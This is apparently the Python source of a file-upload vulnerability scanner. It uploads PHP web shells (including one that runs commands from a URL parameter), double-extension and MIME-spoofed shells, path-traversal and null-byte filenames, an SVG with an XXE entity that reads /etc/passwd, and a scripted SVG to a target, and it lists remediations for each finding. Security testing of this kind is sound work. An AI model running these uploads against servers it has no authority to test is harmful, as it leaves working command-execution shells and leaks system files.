"""
AI-VulnScanner PRO Max - File Upload Vulnerability Tester
Tests for insecure file upload vulnerabilities
"""

import requests
import logging
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin
import io
import time

class FileUploadTester:
    """
    Advanced file upload vulnerability scanner
    Tests for:
    - Unrestricted file upload
    - Weak file type validation
    - Missing file size limits
    - Path traversal in filenames
    - Double extension bypass
    - Content-Type spoofing
    """
    
    def __init__(self, timeout: int = 10):
        """
        Initialize file upload tester
        
        Args:
            timeout: Request timeout in seconds
        """
        self.timeout = timeout
        self.logger = logging.getLogger(__name__)
        
        # Dangerous file extensions to test
        self.dangerous_extensions = [
            '.php', '.php3', '.php4', '.php5', '.phtml',
            '.asp', '.aspx', '.jsp', '.jspx',
            '.exe', '.sh', '.bat', '.cmd',
            '.py', '.rb', '.pl', '.cgi'
        ]
        
        # Double extension bypass attempts
        self.double_extensions = [
            '.jpg.php', '.png.php', '.gif.php',
            '.pdf.php', '.txt.php', '.zip.php'
        ]
        
        # MIME type bypass attempts
        self.mime_bypasses = [
            'image/jpeg', 'image/png', 'image/gif',
            'application/pdf', 'text/plain'
        ]
        
    def scan_upload_forms(self, 
                         base_url: str,
                         forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Scan all file upload forms on a page
        
        Args:
            base_url: Base URL of the target
            forms: List of forms containing file inputs
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        
        for form in forms:
            # Check if form has file input
            if not self._has_file_input(form):
                continue
                
            action = urljoin(base_url, form.get('action', ''))
            method = form.get('method', 'post').upper()
            
            self.logger.info(f"Testing file upload form: {action}")
            
            # Test various upload vulnerabilities
            vulns = self._test_upload_endpoint(action, method, form)
            vulnerabilities.extend(vulns)
            
            time.sleep(0.5)  # Rate limiting
            
        return vulnerabilities
    
    def test_endpoint(self, 
                     url: str,
                     method: str = 'POST') -> List[Dict[str, Any]]:
        """
        Test a single upload endpoint
        
        Args:
            url: Upload endpoint URL
            method: HTTP method
            
        Returns:
            List of vulnerabilities
        """
        vulnerabilities = []
        
        # Test 1: PHP web shell upload
        vuln = self._test_php_upload(url, method)
        if vuln:
            vulnerabilities.append(vuln)
            
        # Test 2: Double extension bypass
        vuln = self._test_double_extension(url, method)
        if vuln:
            vulnerabilities.append(vuln)
            
        # Test 3: MIME type bypass
        vuln = self._test_mime_bypass(url, method)
        if vuln:
            vulnerabilities.append(vuln)
            
        # Test 4: Path traversal in filename
        vuln = self._test_path_traversal_filename(url, method)
        if vuln:
            vulnerabilities.append(vuln)
            
        # Test 5: XXE via SVG upload
        vuln = self._test_xxe_svg(url, method)
        if vuln:
            vulnerabilities.append(vuln)
            
        return vulnerabilities
    
    def _test_php_upload(self, url: str, method: str) -> Optional[Dict[str, Any]]:
        """Test direct PHP file upload"""
        try:
            # Create PHP web shell
            php_content = b'<?php echo "VULN_TEST_".md5(123); ?>'
            
            files = {
                'file': ('test.php', php_content, 'application/x-php')
            }
            
            response = requests.request(
                method,
                url,
                files=files,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            # Check for successful upload indicators
            success_indicators = [
                'upload successful', 'file uploaded', 'uploaded successfully',
                'test.php', 'file saved', 'upload complete'
            ]
            
            response_text = response.text.lower()
            
            for indicator in success_indicators:
                if indicator in response_text:
                    return {
                        'type': 'Unrestricted File Upload',
                        'severity': 'Critical',
                        'location': url,
                        'details': 'Server accepts PHP file uploads without validation',
                        'evidence': f'Upload response contains: "{indicator}"',
                        'payload': 'test.php (PHP web shell)',
                        'impact': 'Attacker can upload web shell and execute arbitrary code',
                        'remediation': [
                            'Implement strict file type validation',
                            'Use whitelist of allowed extensions',
                            'Store uploads outside web root',
                            'Rename uploaded files',
                            'Disable script execution in upload directory'
                        ]
                    }
                    
        except Exception as e:
            self.logger.debug(f"PHP upload test failed: {e}")
            
        return None
    
    def _test_double_extension(self, url: str, method: str) -> Optional[Dict[str, Any]]:
        """Test double extension bypass"""
        try:
            # Try double extension
            content = b'<?php system($_GET["cmd"]); ?>'
            
            files = {
                'file': ('image.jpg.php', content, 'image/jpeg')
            }
            
            response = requests.request(
                method,
                url,
                files=files,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                response_text = response.text.lower()
                
                if any(x in response_text for x in ['uploaded', 'success', 'saved']):
                    return {
                        'type': 'File Upload - Double Extension Bypass',
                        'severity': 'Critical',
                        'location': url,
                        'details': 'Server accepts files with double extensions (e.g., .jpg.php)',
                        'evidence': 'File image.jpg.php accepted',
                        'payload': 'image.jpg.php',
                        'remediation': [
                            'Validate final extension only',
                            'Remove multiple extensions',
                            'Use content-based validation'
                        ]
                    }
                    
        except Exception as e:
            self.logger.debug(f"Double extension test failed: {e}")
            
        return None
    
    def _test_mime_bypass(self, url: str, method: str) -> Optional[Dict[str, Any]]:
        """Test MIME type validation bypass"""
        try:
            # PHP content with image MIME type
            content = b'<?php phpinfo(); ?>'
            
            files = {
                'file': ('shell.php', content, 'image/jpeg')
            }
            
            response = requests.request(
                method,
                url,
                files=files,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                response_text = response.text.lower()
                
                if any(x in response_text for x in ['uploaded', 'success']):
                    return {
                        'type': 'File Upload - MIME Type Bypass',
                        'severity': 'High',
                        'location': url,
                        'details': 'Server validates only MIME type, not actual file content',
                        'evidence': 'PHP file accepted with image/jpeg MIME type',
                        'payload': 'shell.php with spoofed Content-Type',
                        'remediation': [
                            'Validate file content, not just MIME type',
                            'Use magic number validation',
                            'Implement server-side file inspection'
                        ]
                    }
                    
        except Exception as e:
            self.logger.debug(f"MIME bypass test failed: {e}")
            
        return None
    
    def _test_path_traversal_filename(self, url: str, method: str) -> Optional[Dict[str, Any]]:
        """Test path traversal via filename"""
        try:
            # Attempt path traversal in filename
            malicious_names = [
                '../../../shell.php',
                '..\\..\\..\\shell.php',
                'shell.php\x00.jpg'
            ]
            
            for filename in malicious_names:
                files = {
                    'file': (filename, b'test content', 'image/jpeg')
                }
                
                response = requests.request(
                    method,
                    url,
                    files=files,
                    timeout=self.timeout
                )
                
                response_text = response.text.lower()
                
                # Check if path traversal succeeded
                if 'uploaded' in response_text and '..' not in response_text:
                    return {
                        'type': 'File Upload - Path Traversal',
                        'severity': 'High',
                        'location': url,
                        'details': 'Filename not sanitized, allows path traversal',
                        'evidence': f'Filename "{filename}" accepted',
                        'payload': filename,
                        'remediation': [
                            'Sanitize filenames',
                            'Remove path traversal sequences',
                            'Use generated filenames only'
                        ]
                    }
                    
        except Exception as e:
            self.logger.debug(f"Path traversal test failed: {e}")
            
        return None
    
    def _test_xxe_svg(self, url: str, method: str) -> Optional[Dict[str, Any]]:
        """Test XXE via SVG upload"""
        try:
            # SVG with XXE payload
            svg_xxe = b'''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>'''
            
            files = {
                'file': ('test.svg', svg_xxe, 'image/svg+xml')
            }
            
            response = requests.request(
                method,
                url,
                files=files,
                timeout=self.timeout
            )
            
            # Check for XXE indicators
            if 'root:' in response.text or '/bin/bash' in response.text:
                return {
                    'type': 'XML External Entity (XXE) via File Upload',
                    'severity': 'Critical',
                    'location': url,
                    'details': 'SVG upload vulnerable to XXE attack',
                    'evidence': 'Server processed XXE and returned /etc/passwd content',
                    'payload': 'SVG with XXE DOCTYPE',
                    'remediation': [
                        'Disable external entity processing',
                        'Use secure XML parsers',
                        'Validate and sanitize SVG content',
                        'Consider rejecting SVG uploads'
                    ]
                }
                
        except Exception as e:
            self.logger.debug(f"XXE test failed: {e}")
            
        return None
    
    def _test_upload_endpoint(self, 
                             url: str,
                             method: str,
                             form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test upload endpoint with form data"""
        vulnerabilities = []
        
        # Extract form fields
        form_data = {}
        file_field = None
        
        for input_field in form.get('inputs', []):
            name = input_field.get('name', '')
            input_type = input_field.get('type', '').lower()
            
            if input_type == 'file':
                file_field = name
            elif name:
                form_data[name] = input_field.get('value', 'test')
        
        if not file_field:
            return vulnerabilities
        
        # Test with various payloads
        test_cases = [
            ('shell.php', b'<?php system("id"); ?>', 'application/x-php'),
            ('image.jpg.php', b'<?php phpinfo(); ?>', 'image/jpeg'),
            ('test.svg', b'<svg><script>alert(1)</script></svg>', 'image/svg+xml')
        ]
        
        for filename, content, mime in test_cases:
            try:
                files = {file_field: (filename, content, mime)}
                
                response = requests.request(
                    method,
                    url,
                    data=form_data,
                    files=files,
                    timeout=self.timeout
                )
                
                if self._is_upload_successful(response):
                    vulnerabilities.append({
                        'type': 'Insecure File Upload',
                        'severity': 'Critical',
                        'location': url,
                        'details': f'Server accepts dangerous file: {filename}',
                        'evidence': f'Upload successful for {mime}',
                        'payload': filename
                    })
                    break  # One positive is enough
                    
            except Exception as e:
                self.logger.debug(f"Upload test failed for {filename}: {e}")
        
        return vulnerabilities
    
    def _has_file_input(self, form: Dict[str, Any]) -> bool:
        """Check if form has file input"""
        for input_field in form.get('inputs', []):
            if input_field.get('type', '').lower() == 'file':
                return True
        return False
    
    def _is_upload_successful(self, response: requests.Response) -> bool:
        """Check if upload was successful"""
        success_indicators = [
            'upload successful', 'file uploaded', 'uploaded successfully',
            'file saved', 'upload complete', 'successfully uploaded',
            'file has been uploaded', 'upload ok'
        ]
        
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in success_indicators)
